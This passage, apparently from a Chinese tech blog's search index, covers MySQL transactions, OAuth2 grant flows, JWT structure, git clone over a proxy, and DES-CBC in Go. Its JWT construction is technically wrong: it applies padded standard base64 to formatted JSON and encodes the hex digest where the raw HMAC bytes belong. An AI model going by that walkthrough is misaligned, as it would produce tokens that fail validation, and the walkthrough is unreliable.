READ的事务隔离级别下已经能完全保证事务的隔离性要求，即达到SQL标准的SERIALIZABLE隔离级别。\n\n隔离级别越低，事务请求的锁越少或保持锁的时间就越短。这也是为什么大多数数据库系统默认的事务隔离级别是READ COMMITTED。\n\n### 5.6 MySQL数据库分布式事务\n\nInnoDB存储引擎提供了对XA事务的支持，并通过XA事务来支持分布式事务的实现。在使用分布式事务时，InnoDB存储引擎的事务隔离级别必须设置为SERIALIZABLE。\n\nXA事务由一个或多个资源管理器（Resource Managers）、一个事务管理器（Transaction Manager）以及一个应用程序（Application Program）组成。\n\n+ 资源管理器：提供访问事务资源的方法。通常一个数据库就是一个资源管理器。\n+ 事务管理器：协调参与全局事务中的各个事务。需要和参与全局事务的所有资源管理器进行通信。\n+ 应用程序：定义事务的边界，指定全局事务中的操作。\n\n在MySQL数据库的分布式事务中，资源管理器就是MySQL数据库，事务管理器为连接MySQL服务器的客户端。图7-22显示了一个分布式事务的模型。\n\n<img src=\"mysql的锁和事务机制/3.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n分布式事务使用两段式提交（two-phase commit）的方式。\n\n在第一阶段，所有参与全局事务的节点都开始准备（PREPARE），告诉事务管理器它们准备好提交了。在第二阶段，事务管理器告诉资源管理器执行ROLLBACK还是COMMIT。如果任何一个节点显示不能提交，则所有的节点都被告知需要回滚。可见与本地事务不同的是，分布式事务需要多一次的PREPARE操作，待收到所有节点的同意信息后，再进行COMMIT或是ROLLBACK操作。\n\n**Mysql内部XA事务**\n\n最为常见的内部XA事务存在于binlog与InnoDB存储引擎之间。二进制日志和重做日志必须同时写入。若二进制日志先写了，而在写入InnoDB存储引擎时发生了宕机，那么slave可能会接收到master传过去的二进制日志并执行，最终导致了主从不一致的情况。\n\n\n\n当事务提交时，InnoDB存储引擎会先做一个PREPARE操作，将事务的xid写入，接着进行二进制日志的写入，如图7-24所示。如果在InnoDB存储引擎提交前，MySQL数据库宕机了，那么MySQL数据库在重启后会先检查准备的UXID事务是否已经提交，若没有，则在存储引擎层再进行一次提交操作。\n\n<img src=\"mysql的锁和事务机制/4.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n# 6. 头脑风暴\n\n - 行锁包括共享锁 (lock in share mode)，排他锁（for update）\n - 意向锁，和其他锁可以共存。本身也是一个表锁。\n - 行锁三种算法：行记录锁, 间隙锁，next-key 锁（行 + 间）\n - 脏读是读到其他未提交的数据。不可重复度能读到其他事务提交的数据（RR 通过快照读创建一次解决）。\n\n# 7. 参考资料\n\n+ [MySQL事务和锁机制详解](https://www.bilibili.com/video/BV1x54y1979n?from=search&seid=4833652458207423339)\n+ https://www.zhihu.com/question/51513268/answer/127777478\n+ https://www.wencst.com/archives/1521\n+ 索引 https://www.liuvv.com/p/84544518.html\n- 锁和事务 https://www.liuvv.com/p/9762ea3e.html\n- MVCC https://www.liuvv.com/p/a0f7945d.html\n\n","tags":["mysql"],"categories":["mysql"]},{"title":"OAuth2认证流程和授权模式","url":"%2Fp%2F4ce15f73.html","content":"\n随着微服务的兴起，OAuth2也火了起来，由于其自身的优势，俨然已成为微服务API服务接口安全防护的首选。\n\n<!-- more -->\n\n例如有一个\"云冲印\"的网站，可以将用户储存在Google的照片，冲印出来。用户为了使用该服务，必须让\"云冲印\"读取自己储存在Google上的照片。\n\n# 1. 介绍\n\nOAuth2（Open Authorization，开放授权）是OAuth的升级版本。OAuth 是一个开放标准，允许用户让第三方应用访问该用户在某一网站上存储的私密的资源（如照片，视频，联系人列表），而**无需将用户名和密码提供给第三方应用**。\n\nOAuth允许用户提供一个令牌给第三方网站，**一个令牌对应一个特定的第三方网站，同时该令牌只能在特定的时间内访问特定的资源。**\n\n\n\n### 1.1 思路\n\nOAuth在\"客户端\"与\"服务提供商\"之间，设置了一个授权层（authorization layer）。\"客户端\"不能直接登录\"服务提供商\"，只能登录授权层，以此将用户与客户端区分开来。\"客户端\"登录授权层所用的令牌（token），与用户的密码不同。用户可以在登录的时候，指定授权层令牌的权限范围和有效期。\n\n\"客户端\"登录授权层以后，\"服务提供商\"根据令牌的权限范围和有效期，向\"客户端\"开放用户储存的资料。\n\n\n\n### 1.2 角色\n\n+ client：（云冲印）:\t客户端代表向受保护资源进行资源请求的第三方应用程序\n+ resource owner（用户）：资源所有者，指终端的“用户”（user）\n+ authorization server（谷歌授权）： 授权服务器， 在验证资源所有者并获得授权成功后，将发放访问令牌给客户端\n+ resource server：（谷歌照片存放）资源服务器，即服务提供商存放受保护资源。访问这些资源，需要获得访问令牌（access token）\n\n\n\n### 1.3 流程\n\n<img src=\"https://www.ruanyifeng.com/blogimg/asset/2014/bg2014051203.png\" alt=\"OAuth运行流程\" style=\"zoom: 67%;\" />\n\n（A）用户打开客户端以后，客户端要求用户给予授权。\n\n（B）用户同意给予客户端授权。\n\n（C）客户端使用上一步获得的授权，向认证服务器申请令牌。\n\n（D）认证服务器对客户端进行认证以后，确认无误，同意发放令牌。\n\n（E）客户端使用令牌，向资源服务器申请获取资源。\n\n（F）资源服务器确认令牌无误，同意向客户端开放资源。\n\n\n\n不难看出来，上面六个步骤之中，B是关键，即用户怎样才能给于客户端授权。有了这个授权以后，客户端就可以获取令牌，进而凭令牌获取资源。\n\n\n\n# 2. 授权模式\n\n客户端必须得到用户的授权（authorization grant），才能获得令牌（access token）。OAuth 2.0定义了四种授权方式。\n\n### 2.1 授权码模式（authorization code）\n\n授权码模式（authorization code）是功能最完整、流程最严密的授权模式。它的特点就是通过客户端的后台服务器，与\"服务提供商\"的认证服务器进行互动。\n\n<img src=\"OAuth2认证流程和授权模式/bg2014051204.png\" alt=\"授权码模式\" style=\"zoom:67%;\" />\n\n\n\n（A）用户访问客户端，后者将前者导向认证服务器。\n\n（B）用户选择是否给予客户端授权。\n\n（C）假设用户给予授权，认证服务器将用户导向客户端事先指定的\"重定向URI\"（redirection URI），同时附上一个授权码。\n\n（D）客户端收到授权码，附上早先的\"重定向URI\"，向认证服务器申请令牌。这一步是在客户端的后台的服务器上完成的，对用户不可见。\n\n（E）认证服务器核对了授权码和重定向URI，确认无误后，向客户端发送访问令牌（access token）和更新令牌（refresh token）。\n\n\n\n下面是上面这些步骤所需要的参数。\n\nA步骤中，客户端申请认证的URI，包含以下参数：\n\n- response_type：表示授权类型，必选项，此处的值固定为\"code\"\n- client_id：表示客户端的ID，必选项\n- redirect_uri：表示重定向URI，可选项\n- scope：表示申请的权限范围，可选项\n- state：表示客户端的当前状态，可以指定任意值，认证服务器会原封不动地返回这个值。\n\n下面是一个例子。\n\n```http\nGET /authorize?response_type=code&client_id=s6BhdRkqt3&state=xyz&redirect_uri=https://client.example.com/cb HTTP/1.1\nHost: server.example.com\n```\n\nC步骤中，服务器回应客户端的URI，包含以下参数：\n\n- code：表示授权码，必选项。该码的有效期应该很短，通常设为10分钟，客户端只能使用该码一次，否则会被授权服务器拒绝。该码与客户端ID和重定向URI，是一一对应关系。\n- state：如果客户端的请求中包含这个参数，认证服务器的回应也必须一模一样包含这个参数。\n\n下面是一个例子。\n\n```http\nHTTP/1.1 302 Found\nLocation: https://client.example.com/cb?code=SplxlOBeZQQYbYS6WxSbIA&state=xyz\n```\n\nD步骤中，客户端向认证服务器申请令牌的HTTP请求，包含以下参数：\n\n- grant_type：表示使用的授权模式，必选项，此处的值固定为\"authorization_code\"。\n- code：表示上一步获得的授权码，必选项。\n- redirect_uri：表示重定向URI，必选项，且必须与A步骤中的该参数值保持一致。\n- client_id：表示客户端ID，必选项。\n\n下面是一个例子。\n\n```http\nPOST /token HTTP/1.1\nHost: server.example.com\nAuthorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=authorization_code&code=SplxlOBeZQQYbYS6WxSbIA&redirect_uri=https://client.example.com/cb\n```\n\nE步骤中，认证服务器发送的HTTP回复，包含以下参数：\n\n- access_token：表示访问令牌，必选项。\n- token_type：表示令牌类型，该值大小写不敏感，必选项，可以是bearer类型或mac类型。\n- expires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间。\n- refresh_token：表示更新令牌，用来获取下一次的访问令牌，可选项。\n- scope：表示权限范围，如果与客户端申请的范围一致，此项可省略。\n\n下面是一个例子。\n\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json;charset=UTF-8\nCache-Control: no-store\nPragma: no-cache\n\n{\n \"access_token\":\"2YotnFZFEjr1zCsicMWpAA\",\n \"token_type\":\"example\",\n \"expires_in\":3600,\n \"refresh_token\":\"tGzv3JOkF0XG5Qx2TlKWIA\",\n  \"example_parameter\":\"example_value\"\n}\n```\n\n从上面代码可以看到，相关参数使用JSON格式发送（Content-Type: application/json）。此外，HTTP头信息中明确指定不得缓存。\n\n\n\n### 2.2 隐藏模式（implicit）\n\n这种方式把令牌直接传给前端，是很不安全的。因此，只能用于一些安全要求不高的场景，并且令牌的有效期必须非常短，通常就是会话期间（session）有效，浏览器关掉，令牌就失效了。\n\n简化模式（implicit grant type）不通过第三方应用程序的服务器，直接在浏览器中向认证服务器申请令牌，跳过了\"授权码\"这个步骤，因此得名。所有步骤在浏览器中完成，令牌对访问者是可见的，且客户端不需要认证。\n\n<img src=\"OAuth2认证流程和授权模式/bg2014051205.png\" alt=\"简化模式\" style=\"zoom:67%;\" />\n\n\n\n（A）客户端将用户导向认证服务器。\n\n（B）用户决定是否给于客户端授权。\n\n（C）假设用户给予授权，认证服务器将用户导向客户端指定的\"重定向URI\"，并在URI的Hash部分包含了访问令牌。\n\n（D）浏览器向资源服务器发出请求，其中不包括上一步收到的Hash值。\n\n（E）资源服务器返回一个网页，其中包含的代码可以获取Hash值中的令牌。\n\n（F）浏览器执行上一步获得的脚本，提取出令牌。\n\n（G）浏览器将令牌发给客户端。\n\n下面是上面这些步骤所需要的参数。\n\nA步骤中，客户端发出的HTTP请求，包含以下参数：\n\n- response_type：表示授权类型，此处的值固定为\"token\"，必选项。\n- client_id：表示客户端的ID，必选项。\n- redirect_uri：表示重定向的URI，可选项。\n- scope：表示权限范围，可选项。\n- state：表示客户端的当前状态，可以指定任意值，认证服务器会原封不动地返回这个值。\n\n下面是一个例子。\n\n```http\nGET /authorize?response_type=token&client_id=s6BhdRkqt3&state=xyz\n&redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1\nHost: server.example.com\n```\n\nC步骤中，认证服务器回应客户端的URI，包含以下参数：\n\n- access_token：表示访问令牌，必选项。\n- token_type：表示令牌类型，该值大小写不敏感，必选项。\n- expires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间。\n- scope：表示权限范围，如果与客户端申请的范围一致，此项可省略。\n- state：如果客户端的请求中包含这个参数，认证服务器的回应也必须一模一样包含这个参数。\n\n下面是一个例子。\n\n```http\nHTTP/1.1 302 Found\nLocation: http://example.com/cb#access_token=2YotnFZFEjr1zCsicMWpAA\n&state=xyz&token_type=example&expires_in=3600\n```\n\n在上面的例子中，认证服务器用HTTP头信息的Location栏，指定浏览器重定向的网址。注意，在这个网址的Hash部分包含了令牌。\n\n根据上面的D步骤，下一步浏览器会访问Location指定的网址，但是Hash部分不会发送。接下来的E步骤，服务提供商的资源服务器发送过来的代码，会提取出Hash中的令牌。\n\n\n\n### 2.3 密码模式（resource owner password credentials）\n\n密码模式（Resource Owner Password Credentials Grant）中，用户向客户端提供自己的用户名和密码。客户端使用这些信息，向\"服务商提供商\"索要授权。\n\n在这种模式中，用户必须把自己的密码给客户端，但是客户端不得储存密码。这通常用在用户对客户端高度信任的情况下，比如客户端是操作系统的一部分，或者由一个著名公司出品。而认证服务器只有在其他授权模式无法执行的情况下，才能考虑使用这种模式。\n\n<img src=\"OAuth2认证流程和授权模式/bg2014051206.png\" alt=\"密码模式\" style=\"zoom:67%;\" />\n\n它的步骤如下：\n\n（A）用户向客户端提供用户名和密码。\n>\n（B）客户端将用户名和密码发给认证服务器，向后者请求令牌。\n>\n（C）认证服务器确认无误后，向客户端提供访问令牌。\n\nB步骤中，客户端发出的HTTP请求，包含以下参数：\n\n- grant_type：表示授权类型，此处的值固定为\"password\"，必选项。\n- username：表示用户名，必选项。\n- password：表示用户的密码，必选项。\n- scope：表示权限范围，可选项。\n\n下面是一个例子。\n\n```http\nPOST /token HTTP/1.1\nHost: server.example.com\nAuthorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=password&username=johndoe&password=A3ddj3w\n```\n\nC步骤中，认证服务器向客户端发送访问令牌，下面是一个例子。\n\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json;charset=UTF-8\nCache-Control: no-store\nPragma: no-cache\n\n{\n\"access_token\":\"2YotnFZFEjr1zCsicMWpAA\",\n\"token_type\":\"example\",\n\"expires_in\":3600,\n\"refresh_token\":\"tGzv3JOkF0XG5Qx2TlKWIA\",\n\"example_parameter\":\"example_value\"\n}\n```\n\n整个过程中，客户端不得保存用户的密码。\n\n\n\n### 2.4 客户端模式（client credentials）\n\n客户端模式（Client Credentials Grant）指客户端以自己的名义，而不是以用户的名义，向\"服务提供商\"进行认证。严格地说，客户端模式并不属于OAuth框架所要解决的问题。在这种模式中，用户直接向客户端注册，客户端以自己的名义要求\"服务提供商\"提供服务，其实不存在授权问题。\n\n<img src=\"OAuth2认证流程和授权模式/bg2014051207.png\" alt=\"客户端模式\" style=\"zoom:67%;\" />\n\n\n\n它的步骤如下：\n\n（A）客户端向认证服务器进行身份认证，并要求一个访问令牌。\n>\n（B）认证服务器确认无误后，向客户端提供访问令牌。\n\nA步骤中，客户端发出的HTTP请求，包含以下参数：\n\n- grant*type：表示授权类型，此处的值固定为\"client*credentials\"，必选项。\n- scope：表示权限范围，可选项。\n\n```http\nPOST /token HTTP/1.1\nHost: server.example.com\nAuthorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=client_credentials\n```\n\n认证服务器必须以某种方式，验证客户端身份。\n\nB步骤中，认证服务器向客户端发送访问令牌，下面是一个例子。\n\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json;charset=UTF-8\nCache-Control: no-store\nPragma: no-cache\n\n{\n\"access_token\":\"2YotnFZFEjr1zCsicMWpAA\",\n\"token_type\":\"example\",\n\"expires_in\":3600,\n\"example_parameter\":\"example_value\"\n}\n```\n\n\n\n# 3. 使用\n\n### 3.1 令牌的使用\n\nA 网站拿到令牌以后，就可以向 B 网站的 API 请求数据了。\n此时，每个发到 API 的请求，都必须带有令牌。具体做法是在请求的头信息，加上一个Authorization字段，令牌就放在这个字段里面。\n\ncurl -H \"Authorization: Bearer ACCESS_TOKEN\" \"https://api.b.com\"\n\n上面命令中，ACCESS_TOKEN就是拿到的令牌。\n\n\n\n### 3.2 更新令牌\n\n如果用户访问的时候，客户端的\"访问令牌\"已经过期，则需要使用\"更新令牌\"申请一个新的访问令牌。\n\n客户端发出更新令牌的HTTP请求，包含以下参数：\n\n- grant_type：表示使用的授权模式，此处的值固定为\"refresh_token\"，必选项。\n- refresh_token：表示早前收到的更新令牌，必选项。\n- scope：表示申请的授权范围，不可以超出上一次申请的范围，如果省略该参数，则表示与上一次一致。\n\n下面是一个例子。\n\n```http\nPOST /token HTTP/1.1\nHost: server.example.com\nAuthorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=refresh_token&refresh_token=tGzv3JOkF0XG5Qx2TlKWIA\n```\n\n\n\n# 4. 参考资料\n\n+ http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html\n+ https://www.ruanyifeng.com/blog/2019/04/github-oauth.html\n\n\n\n\n\n","tags":["http"],"categories":["web"]},{"title":"基于jwt的token认证","url":"%2Fp%2F722ed7e7.html","content":"\nJSON Web Token（缩写 JWT）是目前最流行的**跨域认证解决方案**。\n\n<!-- more -->\n\n# 1. token认证\n\n当用户成功登陆系统并成功验证有效之后，服务器会利用某种机制产生一个token字符串，这个token中可以包含很多信息，例如来源IP，过期时间，用户信息等， 把这个字符串下发给客户端，客户端在之后的每次请求中都携带着这个token，携带方式其实很自由，无论是cookie方式还是其他方式都可以。当服务端收到请求，取出token进行验证（可以验证来源ip，过期时间等信息），如果合法则允许进行操作。\n\n### 1.1 优点\n\n1. 支持跨域访问：Cookie是不允许垮域访问的，这一点对Token机制是不存在的，前提是传输的用户认证信息通过HTTP头传输。\n2. 无状态: Token机制在服务端不需要存储session信息，因为Token自身包含了所有登录用户的信息，只需要在客户端的cookie或本地介质存储状态信息。\n3. 解耦：不需要绑定到一个特定的身份验证方案。Token可以在任何地方生成，只要在你的API被调用的时候，你可以进行Token生成调用即可.\n4. 适用性更广：只要是支持http协议的客户端，就可以使用token认证。\n5. 服务端只需要验证token的安全，不必再去获取登录用户信息，因为用户的登录信息已经在token信息中。\n6. 基于标准化：你的API可以采用标准化的 JSON Web Token (JWT). \n\n### 1.2 缺点\n\n1. 网络传输的数据量增大：由于token中存储了大量的用户和安全相关的信息，所以比单纯的cookie信息(例如session_id)要大很多，传输过程中需要消耗更多流量，占用更多带宽，\n2. 和所有的客户端认证方式一样，如果想要在服务端控制token的注销有难度，而且也很难解决客户端的劫持问题。\n3. 由于token信息在服务端增加了一次验证数据完整性的操作，所以比session的认证方式增加了cpu的开销。\n\n但是整体来看，基于token的认证方式还是比session和cookie方式要有很大优势。在所知的token认证中，jwt是一种优秀的解决方案。\n\n\n\n# 2. jwt结构\n\nJSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。\n\n一个JWT实际上就是一个字符串，它由三部分组成，头部、载荷与签名。中间用点（`.`）分隔成三个部分。注意JWT 内部是没有换行的。\n\n![img](基于jwt的token认证/bg2018072303.jpg)\n\n\n\n### 2.1 头部\n\nheader典型的由两部分组成：token的类型（“JWT”）和算法名称（比如：HMAC SHA256或者RSA等等）。\n\n```json\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\"\n}\n```\n\n将上面的内容进行base64编码,可以得到我们JWT的头部,编码后如下:\n\n```\newogICJhbGciOiAiSFMyNTYiLAogICJ0eXAiOiAiSldUIgp9ICA=\n```\n\n\n\n### 2.2 Payload\n\nPayload 部分也是一个JSON对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。\n\n```erlang\niss (issuer)：该JWT的签发者\nexp (expiration time)：什么时候过期，这里是一个Unix时间戳\nsub (subject)：该JWT所面向的用户\naud (audience)：接收该JWT的一方\nnbf (Not Before)：生效时间\niat (Issued At)：在什么时候签发的\njti (JWT ID)：编号\n```\n\n除了以上字段之外，你完全可以添加自己想要的任何字段，这里还是提醒一下，由于jwt的标准，信息是不加密的，所以一些敏感信息最好不要添加到json里面\n\n```json\n{\n    \"iss\": \"liuvv.com\",\n    \"iat\": 1500218077,\n    \"exp\": 1500218077,\n    \"aud\": \"www.liuvv.com\",\n    \"sub\": \"1@liuvv.com\",\n    \"user_id\": \"dc2c4eefe2d141490b6ca612e252f92e\",\n    \"user_token\": \"09f7f25cdb003699cee05759e7934fb2\"\n}\n```\n\n现在我们需要将负载这整个部分进行base64编码,编码后结果如下:\n\n```\newogICAgImlzcyI6ICJMZWZ0by5jb20iLAogICAgImlhdCI6IDE1MDAyMTgwNzcsCiAgICAiZXhwIjogMTUwMDIxODA3NywKICAgICJhdWQiOiAid3d3LmxlZnRzby5jb20iLAogICAgInN1YiI6ICJsZWZ0c29AcXEuY29tIiwKICAgICJ1c2VyX2lkIjogImRjMmM0ZWVmZTJkMTQxNDkwYjZjYTYxMmUyNTJmOTJlIiwKICAgICJ1c2VyX3Rva2VuIjogIjA5ZjdmMjVjZGIwMDM2OTljZWUwNTc1OWU3OTM0ZmIyIgp9\n```\n\n\n\n### 2.3 Signature\n\n为了得到签名部分，你必须有编码过的header、编码过的payload、一个秘钥（这个秘钥只有服务端知道），签名算法是header中指定的那个，然对它们签名即可。\n\n```js\nHMACSHA256(base64UrlEncode(header) + \".\" + base64UrlEncode(payload), secret)\n```\n\n\n\n首先需要将头部和负载通过.链接起来就像这样:header.Payload,上述的例子链接起来之后就是这样的:\n\n```\newogICJhbGciOiAiSFMyNTYiLAogICJ0eXAiOiAiSldUIgp9ICA=.ewogICAgImlzcyI6ICJMZWZ0by5jb20iLAogICAgImlhdCI6IDE1MDAyMTgwNzcsCiAgICAiZXhwIjogMTUwMDIxODA3NywKICAgICJhdWQiOiAid3d3LmxlZnRzby5jb20iLAogICAgInN1YiI6ICJsZWZ0c29AcXEuY29tIiwKICAgICJ1c2VyX2lkIjogImRjMmM0ZWVmZTJkMTQxNDkwYjZjYTYxMmUyNTJmOTJlIiwKICAgICJ1c2VyX3Rva2VuIjogIjA5ZjdmMjVjZGIwMDM2OTljZWUwNTc1OWU3OTM0ZmIyIgp9\n```\n\n由于HMacSHA256加密算法需要一个key,我们这里key暂时用liuvv吧\n\n加密后的内容为:\n\n```\n686855c578362e762248f22e2cc1213dc7a6aff8ebda52247780eb6b5ae91877\n```\n\n对上面的签名内容进行base64编码得到最终的签名\n\n```\nNjg2ODU1YzU3ODM2MmU3NjIyNDhmMjJlMmNjMTIxM2RjN2E2YWZmOGViZGE1MjI0Nzc4MGViNmI1YWU5MTg3Nw==\n```\n\n最终的JWT：\n\n```\newogICJhbGciOiAiSFMyNTYiLAogICJ0eXAiOiAiSldUIgp9ICA=.ewogICAgImlzcyI6ICJMZWZ0by5jb20iLAogICAgImlhdCI6IDE1MDAyMTgwNzcsCiAgICAiZXhwIjogMTUwMDIxODA3NywKICAgICJhdWQiOiAid3d3LmxlZnRzby5jb20iLAogICAgInN1YiI6ICJsZWZ0c29AcXEuY29tIiwKICAgICJ1c2VyX2lkIjogImRjMmM0ZWVmZTJkMTQxNDkwYjZjYTYxMmUyNTJmOTJlIiwKICAgICJ1c2VyX3Rva2VuIjogIjA5ZjdmMjVjZGIwMDM2OTljZWUwNTc1OWU3OTM0ZmIyIgp9.Njg2ODU1YzU3ODM2MmU3NjIyNDhmMjJlMmNjMTIxM2RjN2E2YWZmOGViZGE1MjI0Nzc4MGViNmI1YWU5MTg3Nw==\n```\n\n可以在线玩玩：https://www.bejson.com/jwt/\n\n# 3. jwt使用\n\n### 3.1 流程\n\n1. 客户端携带用户的登录凭证（一般为用户名密码）提交请求。\n2. 服务端收到登录请求，验证凭证正确性，如果正确则按照协议规定生成token信息，经过签名并返回给客户端。\n3. 客户端收到token信息，可以保存在cookie或者其他地方，以后每次请求的时候都携带上token信息。\n4. 业务服务器收到请求，验证token的正确性，如果正确则进行下一步操作。\n\n![image](基于jwt的token认证/1460000023870648.jpeg)\n\n### 3.2 交互\n\n客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。此后，客户端每次与服务器通信，都要带上这个 JWT。\n\n你可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求的头信息Authorization字段里面。\n\n```js\nAuthorization: Bearer <token>\n\nfetch('api/user/1', {\n  headers: {\n    'Authorization': 'Bearer ' + token\n  }\n})\n```\n\n### 3.3 特点\n\n（1）JWT 默认是不加密，但也是可以加密的。生成原始 Token 以后，可以用密钥再加密一次。\n（2）JWT 不加密的情况下，不能将秘密数据写入 JWT。\n（3）JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。\n（4）JWT 的最大缺点是，由于服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或者更改 token 的权限。也就是说，一旦 JWT 签发了，在到期之前就会始终有效，除非服务器部署额外的逻辑。\n（5）JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。\n（6）为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。\n\n### 3.4 问题\n\n1. 用户登出，如何设置token无效？\n   + 用户登出，浏览器端丢弃token\n   + 使用redis数据库，用户登出，从redis中删除对应的token,请求访问时，需要从redis库中取出对应的token,若没有，则表明已经登出\n\n2. 两个不同的设备，一个设备登出，另外一个设备如何处理？\n   + 服务器维护一个清单（记录该账号是否已经签发token），这样又回到session的老路了\n   + 每一个设备与用户生成唯一的key,保存在redis中，即设备1的用户登出，只删除对应的token，设备2的token仍然存在\n   + 服务器端维护一个版本号，相同用户不同设备登入，版本号加1，这样保持key的唯一性（和上面差不多）\n\n\n\n# 4. 参考资料\n\n+ https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html","tags":["http"],"categories":["web"]},{"title":"解决git clone github下载慢龟速的问题","url":"%2Fp%2F94e659ca.html","content":"\ngithub 在家天天下载十几k, 忍你好久了, 实在是忍不了了..\n\n<!-- more -->\n\n# 1. 解决方案\n\n### 1.1 代理(最实用)\n\n复制 clashX 的终端代理命令, 复制一般如下: \n\n```bash\nexport https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890\n```\n\n然而发现没有什么卵用, 还是10几 k. \n\n最后才发现我的 git clone 都是用的 ssh 协议,  虽然设置了 https 代理, 但 git clone git@github.com 没用。因为 ssh 不走 https!!!!\n\n正确的方案是走 ssh 代理!!!\n\n`vi ~/.ssh/config`\n\n```bash\nHost github.com\n        HostName github.com\n        IdentityFile ~/.ssh/github-unix2dos\n        User unix2dos\n        ProxyCommand nc -v -x 127.0.0.1:7890 %h %p\n```\n\n\n\n### 1.2 增强模式\n\nhttps://install.appcenter.ms/users/clashx/apps/clashx-pro/distribution_groups/public \n\n安装 clashx pro 版本。打开增强模式 就可以直接代理命令行了.\n\n系统所有流量经过 clash，对软件透明.\n\n\n\n### 1.3 减少拉取\n\n如果 拉取 GitHub 项目仅仅是查看，可以加上 --depth=1 参数。\n\ndepth用于指定克隆深度，为1即表示只克隆最近一次commit.\n\n```bash\ngit clone --depth 1 https://github.com/unix2dos/unix2dos.git\n```\n\n这种方法克隆的项目只包含最近的一次commit的一个分支，体积很小，即可解决项目过大导致Timeout的问题，但会产生另外一个问题，他只会把默认分支clone下来，其他远程分支并不在本地.\n\n```bash\ngit clone -b ${branch} --depth=1 #可以拉对应分支\n```\n\n\n\n### 1.4 chrome 插件\n\n https://github.com/fhefh2015/Fast-GitHub\n\n国内Github下载很慢，用上了这个插件后，下载速度嗖嗖嗖的~！\n\n其实自己测试后发现, 也没有发现很快..\n\n\n\n# 2. 参考资料\n\n+ https://v2ex.com/t/730171\n+ https://github.com/fhefh2015/Fast-GitHub\n\n","tags":["github"],"categories":["git"]},{"title":"des加解密cbc模式golang和javascript的实现","url":"%2Fp%2F8b88eb3d.html","content":"\n# 1. 介绍\n\n### 1.1 对称加密算法\n\n+ DES：DES 全称 Data Encryption Standard，是一种使用密钥加密的块算法。现在认为是一种不安全的加密算法，因为现在已经有用穷举法攻破 DES 密码的报道了。\n\n+ 3DES（或称为 Triple DES）是三重数据加密算法（TDEA，Triple Data Encryption Algorithm）块密码的通称。它相当于是对每个数据块应用三次 DES 加密算法。由于计算机运算能力的增强，原版 DES 密码的密钥长度变得容易被暴力破解；3DES 即是设计用来提供一种相对简单的方法，即通过增加 DES 的密钥长度来避免类似的攻击，而不是设计一种全新的块密码算法。\n+ AES 全称是 Advanced Encryption Standard，翻译过来是高级加密标准，它是用来替代之前的 DES 加密算法的。AES 加密算法的安全性要高于 DES 和 3DES，所以 AES 已经成为了主要的对称加密算法。+\n+ 2000年代，DES逐渐被[3DES](https://zh.wikipedia.org/wiki/3DES)替代。2010年代，3DES逐渐被更安全的[高级加密标准](https://zh.wikipedia.org/wiki/高級加密標準)（AES）替代。\n\n<!-- more -->\n\n### 1.2 DES加密模式\n\n##### 1.2.1 ECB\n\nECB模式又称电子密码本模式：Electronic codebook，是最简单的块密码加密模式，加密前根据加密块大小分成若干块，之后将每块使用相同的密钥单独加密，解密同理。\n\n**优点：**\n\n+ 简单；\n\n+ 有利于并行计算；\n\n\n+ 误差不会被传递；\n\n**缺点：**\n\n+ 不能隐藏明文的模式；\n\n+ 可能对明文进行主动攻击\n\n  \n\n##### 1.2.2 CBC\n\n密码分组链接（CBC，Cipher-block chaining）模式，由IBM于1976年发明，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量IV\n\n**优点**：\n\n+ 不容易主动攻击，安全性好于ECB，是SSL、IPSec的标准；\n\n**缺点**：\n\n+ 不利于并行计算；\n+ 误差传递；\n+ 需要初始化向量IV；\n\n# 2. 实现\n\n### 2.1 golang代码\n\n```go\npackage main\n\nimport (\n\t\"bytes\"\n\t\"crypto/des\"\n\t\"crypto/cipher\"\n\t\"encoding/base64\"\n\t\"fmt\"\n)\n\nfunc DesEncryption(key, iv, plainText []byte) ([]byte, error) {\n\tblock, err := des.NewCipher(key)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tblockSize := block.BlockSize()\n\torigData := PKCS5Padding(plainText, blockSize)\n\tblockMode := cipher.NewCBCEncrypter(block, iv)\n\tcryted := make([]byte, len(origData))\n\tblockMode.CryptBlocks(cryted, origData)\n\treturn cryted, nil\n}\n\nfunc DesDecryption(key, iv, cipherText []byte) ([]byte, error) {\n\tblock, err := des.NewCipher(key)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tblockMode := cipher.NewCBCDecrypter(block, iv)\n\torigData := make([]byte, len(cipherText))\n\tblockMode.CryptBlocks(origData, cipherText)\n\torigData = PKCS5UnPadding(origData)\n\treturn origData, nil\n}\n\nfunc PKCS5Padding(src 